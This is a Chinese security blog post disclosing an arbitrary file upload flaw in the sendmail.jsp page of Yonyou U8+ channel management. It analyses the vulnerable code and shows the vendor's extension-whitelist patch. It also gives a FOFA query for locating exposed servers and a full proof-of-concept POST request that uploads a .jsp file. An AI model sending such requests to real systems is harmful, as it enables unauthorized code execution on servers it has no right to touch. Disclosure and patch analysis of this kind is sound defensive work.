---
title: "用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞"
source: https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html
asset_dir: assets/用友u8+渠道管理(高级版)-sendmail.jsp-文件上传漏洞
---

# 用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/8/14 08:30
* 676浏览
* [0评论](#comment)
* 26分钟阅读

深入探索

SQL

服务器

CRM


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)U8+是用友公司推出的企业管理软件套件，广泛应用于财务、供应链、人力资源等多个业务领域。在U8+渠道管理（高级版）模块中，存在一处[文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)漏洞，位于其 `sendmail.jsp` 文件中。攻击者可通过构造特定的HTTP请求，将恶意脚本或可执行文件上传至服务器。该漏洞可能导致攻击者在目标服务器上[执行任意代码](https://mrxn.net/tag/rce)，从而获取服务器控制权限，进一步窃取敏感数据、篡改业务数据或对内网其他系统发起攻击。

电子邮件与即时消息

# 影响版本

V18, V16.5, V16.1, V16.0, V15.1, V15.0, V13

# fofa语法

> title="渠道管理（高级版）"

# 漏洞分析

深入探索

恶意软件分析工具

SQL注入检测工具

代码安全审计

根据补丁变化

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-001-c4d00a15780c.webp)](https://image.mrxn.net/c7e02dd14b054ecdaf84931546224db1.webp)

直接看 `sendmail.jsp` 文件里有关文件处理的实现逻辑

漏洞扫描服务

```
<%

    com.gxfcsoft.framework.base.upload.Upload myUpload=new com.gxfcsoft.framework.base.upload.Upload();    
    myUpload.initialize(pageContext);
    myUpload.upload();

    String touser = myUpload.getRequest().getParameter("touser");
    String subject = myUpload.getRequest().getParameter("subject");
    String discerptesend =myUpload.getRequest().getParameter("discerptesend");

    String affix = myUpload.getFiles().getFile(0).getFileName();
    String body = myUpload.getRequest().getParameter("body");

    int iCount = myUpload.getFiles().getFile(0).getSize();

    //System.out.println("iCount="+iCount);

    String path = com.gxfcsoft.framework.base.util.PathUtil.getUserFile()+"messageserv"+java.io.File.separator;
    String fileFullName = "";

    if (iCount != 0) {
       String fieldID = com.gxfcsoft.framework.base.util.UUID.getID();
       if(affix.indexOf(".")!=-1)
          fieldID +=affix.substring(affix.lastIndexOf("."));

       myUpload.saveAs(path, fieldID);
       fileFullName = path+fieldID;

    }

    %>
```

深入探索

安全工具开发

网络安全课程

授权

文件后缀从上传文件名中获取，然后拼接到uuid后面形成新的文件名，期间对文件类型和内容无校验或过滤，因此造成任意[文件上传漏洞](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)，非常朴实无华！

物流软件安全

# 漏洞复现

```
POST /business/ums/sendmail.jsp HTTP/1.1
Host: u8.mrxn.net
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="touser"

aa@qq.com
------WebKitFormBoundary
Content-Disposition: form-data; name="subject"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="discerptesend"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="body"

test
------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="1.jsp"

UPLOAD_TEST
------WebKitFormBoundary--
```

在响应里成功回显上传文件的完整路径，直接访问

计算机服务器

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-002-a045bd7c7d7e.webp)](https://image.mrxn.net/ed4ee4b6cef74ae287f473a7bbd88d0c.webp)

访问上传文件

[![用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](images/img-003-bc14d112831e.webp)](https://image.mrxn.net/c29b5a73adee47738729aec96a2c8536.webp)

成功[执行](https://mrxn.net/tag/rce)我们上传代码

漏洞扫描服务

官方补丁修复也很直接，直接正则检测后缀是否为白名单

```
String[] allowedExts = {
                "text", "txt", "doc", "wps", "docx", "xls", "xlsx", "pdf", "zip",
                "ppt", "jpeg", "png", "gif", "jpg", "rar", "xml", "svg"
};

boolean isValid = false;
for (String ext : allowedExts) {
        if (suffix.equals(ext)) {
                isValid = true;
                break;
        }
}

if (isValid) {
        fileFullName = path + fieldID + "." + suffix;
} else {
        fileFullName = ""; // 不合法后缀，避免使用
}
```

# 参考

* [关于U8+渠道管理(高级版)存在文件上传漏洞的公告](https://security.yonyou.com/#/noticeInfo?id=727)

* 标签：
* [#代码](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81)
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#rce](https://mrxn.net/tag/rce)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)
* [#文件上传](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)
* [6.参考](#toc-6-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8+渠道管理(高级版) sendmail.jsp 文件上传漏洞](https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html)  
文章链接：<https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全运维咨询

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-business-ums-sendmail-upload-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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